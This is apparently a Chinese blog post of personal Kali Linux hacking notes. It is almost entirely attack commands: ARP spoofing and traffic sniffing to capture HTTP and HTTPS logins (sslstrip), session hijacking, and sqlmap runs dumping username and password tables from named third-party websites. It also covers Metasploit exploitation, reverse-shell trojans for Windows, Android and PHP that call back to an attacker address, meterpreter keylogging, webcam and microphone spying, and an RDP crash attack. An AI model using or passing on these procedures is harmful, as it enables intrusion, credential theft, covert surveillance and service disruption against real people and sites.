#  			[kali 渗透的一些笔记](https://www.cnblogs.com/Silvers/p/5843207.html) 		



kali实战笔记 17:55 2016/7/19 by: _Silvers

kali系统安装后的配置及美化
安装vmwareTools
tar zxvf VMwareTools-sfsfsfasfasfsaf #解压安装包
cd 到解压后的安装目录 
./ 绿色的可执行文件 #进行安装
\# 等待安装结束，期间根据提示进行y/n确定
reboot # 重启kali
kali系统更新及替换国内软件源
leafpad /etc/apt/sources.list
注释掉官方的更新源
复制国内的更新源 #可百度国内更新源地址（新手推荐阿里云的源）
更新系统
apt-get update #更新系统
apt-get dist-upgrade #安装更新
kali的美化
apt-get install kde-full #kde桌面的安装
端口扫描
nmap -sS 目标ip
Arp 内网断网
Arpspoof -i 网卡 -t 目标ip 网关
获取网卡/网关
ifconfig
获取内网ip
fping -asg 192.168.1.0/24
Arp 欺骗
echo 写命令，是不会有回显的
ehco 1 >proc/sys/net/ipv4/ip_forward
\# 进行IP流量转发
目标 --》 我的网卡 --》网关
driftnet --> 获取本机网卡的图片iw
driftnet -i eth0 获取本机网卡的图片
ifconfig #查看网络信息
iwconfig #查看网卡信息
kali中查找程序或命令
ex:sqlmap 
find / -name sqlmap
find / -name ettercap

桌面美化工具 雨滴.exe (window)
==============================================================================
HTTP 帐号密码获取
Arpspoof --> 欺骗
Ettercap --> 欺骗 DNS欺骗 流量 嗅探
实战前的信息采集：
目标机器： 目标ip，网关
攻击机器： kali ip
arpspoof -i eth0 -t 目标ip 网关
开启ip转发
echo 1 >/proc/sys/net/ipv4/ip_forward
cat 查看内容
cat /proc/sys/net/ipv4/ip_forward
启动ettercap进行流量嗅探
ettercap -Tq -i eth0
-Tq --> -T: 启动文本模式，q:安静模式；
-i --> i: 网关；
url解码：www.convertstring.com
HTTPS 账户密码获取
进入kali文本模式
在进入输入用户名界面按ctrl+alt+F1
开启SSH链接服务
一、配置SSH参数
修改sshd_config文件，命令为：
vi /etc/ssh/sshd_config
将#PasswordAuthentication no的注释去掉，并且将NO修改为YES //kali中默认是yes
将PermitRootLogin without-password修改为
PermitRootLogin yes
Kali 2.0使用SSH进行远程登录
然后，保存，退出vim。
二、启动SSH服务
命令为：
/etc/init.d/ssh start 
或者
service ssh start
查看SSH服务状态是否正常运行，命令为：
/etc/init.d/ssh status
或者
service ssh status

/etc/init.d/ssh start
==========================
vim /etc/ettercap/etter.conf
修改iptables规则
去掉注释符号
保存推出
sslstrip --》 可以把HTTPS还原为http
arpspoof -i eth0 -t 目标ip 网关
开启ip转发
echo 1 >/proc/sys/net/ipv4/ip_forward
ettercap -Tq -i eth0
sslstrip -a -f -k

缺点：容易出现证书错误！
==============================
会话劫持
需要的工具
Arpspoof ==> Arp欺骗
Wireshark ==> 抓包
ferret ==> 重新生成抓包后的文件
hamster ==> 重放流量
\#trip1：基于arp欺骗
arpspoof
arpspoof -i eth0 -t 目标ip 网关 
echo 1 >/proc/sys/net/ipv4/ip_forward
start Wireshark #开始抓包

ferret -r cockie.pcap #生成hamster.txt

\#trip2：基于ferret
ferret -1 eth0
hamster

\#trip3：基于CookieCadger.jar一键劫持
install CookieCadger
选择网卡
动态截取流量
======================================================
SqlMap 
asp 网站，大多用的Access 文件 数据库 MSSQL数据库
数据库
表
字段(列)
sqlmap -u http://www.baidu.com
-u 检测是否存在注入
成功，返回数据库信息
sqlmap -u www.baidu.com --tables
暴力猜解所有表名（有点慢）
sqlmap -u http://www.baidu.com --columns -T "user"
--columns 猜列名 根据user 
sqlmap -u "http://www.baidu.com" --dump -C "username,password" -T "user"
--dump 下载数据 -C "username,password"列名
php 网站， 大多用Mysql
sqlmap -u "http://www.ggec.com.cn/oneNews.php?id=69" --is-dba
back-end DBMS:MySQL >= 5.0.0
sqlmap -u "http://www.ggec.com.cn/oneNews.php?id=69" --dbs
列出所有数据库
sqlmap -u "http://www.ggec.com.cn/oneNews.php?id=69" --current-db
查找自己的数据库
sqlmap -u "http://www.ggec.com.cn/oneNews.php?id=69" --tables -D "ggec"
猜解(查询)所有表名 根据 ggec
sqlmap -u "http://www.ggec.com.cn/oneNews.php?id=69" --columns -T "ggec_admin" -D "ggec"
查询 所有的列
sqlmap -u "http://www.ggec.com.cn/oneNews.php?id=69" --dump -C "username,password" -T "ggec_admin" -D "ggec"
查询列的字段

www.cmd5.com md5在线加解密站点
====================================
sqlmap cookie注入
sqlmap -u "http://www.wisefund.com.cn/about.asp" --cookie "id=56" --level 2
--cookie "" 这里写id的参数，如果是cookie注入，就要把等级提升为level 2
sqlmap -u "http://www.wisefund.com.cn/about.asp" --tables --cookie "id=56" --level 2
sqlmap -u "http://www.wisefund.com.cn/about.asp" --columns -T "user" --cookie "id=56" --level 2
sqlmap -u "http://www.wisefund.com.cn/about.asp" --dump -C "username,password" -T "user" --cookie "id=56" --level 2
===========================================================================================================================
Metasploit 基础
Exploit 模块 -- 》 漏洞利用
Payloads -- 》 shellCode 
use exploit/windows/smb/ms08_067_netapi
选择漏洞利用模块
show options
查看要填入的参数
set RHOST 192.168.1,100
set PAYLOAD window/meterpreter/reverse_tcp
RHOST --> 目标IP
LHOST --> 本机IP
exploit --》 执行操作 
实施攻击成功则反馈
msfconsole 从终端启动metasploit
background
sessions -i number 
木马 ：控制端 服务端
控制远程 木马程序
a.根据自己的IP生成一个马
我的IP 192.168.1.103 55555
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=55555
X> test.exe
这么下来，就会生成一个test.exe的木马程序
b. use exploit/multi/handler
使用handler这个模块
set PAYLOAD windows/meterpreter/reverse_tcp
使用这个shellcode

LHOST = 192.168.1.103
LRORT = 55555
这里填写 生成木马的IP和端口
c. 先执行msf，再执行马
木马的使用
注入进程：木马随时有可能被结束掉的
ps: 得到我们要注入的PID进程
2036 2004 explorer.exe 桌面进程
migrate 2036 #注入进程
远程桌面的开启：
Run vnc 开启远程桌面
文件管理功能
Downlaod 下载文件
Edit 编辑文件
Cat 查看文件
mkdir 创建文件
Mv 移动文件
Rm 删除文件
Upload 上传文件
Rmdir 删除文件夹
查看PHP文件：　cat hack.php
下载文件： download hack.php
删除文件： rm hack.php
上传文件： upload hack.php
网络及系统操作
Arp 查看ARP缓冲表
Ifconfig 查看IP地址网卡
Getproxy 获取代理
Netstat 查看端口链接
kill 杀死进程
ps	查看进程
reboot 重启机器
reg 修改注册表
shell 获取shell
shutdown 关机
sysinfo 获取电脑信息
用户操作和其他功能讲解
enumdesktops	窗体	
keyscan_dump	键盘记录 -- 下载
keyscan_start	键盘记录 -- 开始
keyscan_stop	键盘记录 -- 停止
Uict1	获取键盘鼠标控
uictl disable keyboard/mouse 禁用键盘/鼠标 
uictl enable keyboard/mouse 启用键盘/鼠标制权
record_mic	音频录制
record_mic -d 10 后台录音10秒
webcam_chat	查看摄像头接口
webcam_list 查看摄像头列表
webcam_stream	摄像头视频获取
GetSystem 获取高权限

Hashdump	下载hash
=========================================================
Metasploit Androd实战笔记
Msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.103 LPROT=55555 
R > test.apk
Search	搜索 jpg,png,bmp
Download	下载	jpg,png,bmp
webcam_snap	手机截屏 
webcam_stream -i [1:2?] 手机摄像头监控
check_root	检测Root	
dump_calllog	下载电话记录
dump_contacts 下载信息记录
Geolocate 定位
==================================================
Metasploit服务器蓝屏攻击
DDos
服务器开启 3389
确定目标： 192.168.1.103
MS12 020
auxiliary/dos/windows/rdp/ms12_020_maxchannelids
服务器远程桌面的一个可用模块
auxiliary/scanner/rdp/ms12_020_check
扫描主机是否存在漏洞
RHOST R开头，远程主机 
auxiliary/dos/windows/rdp/ms12_020_maxchannelids
目的：比DDos来的更直接一些
Metasploit生成webshell
a.在msf中生成一个PHP脚本
msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.101 R > web.php
生成一个PHP脚本
　　cat 查看文件内容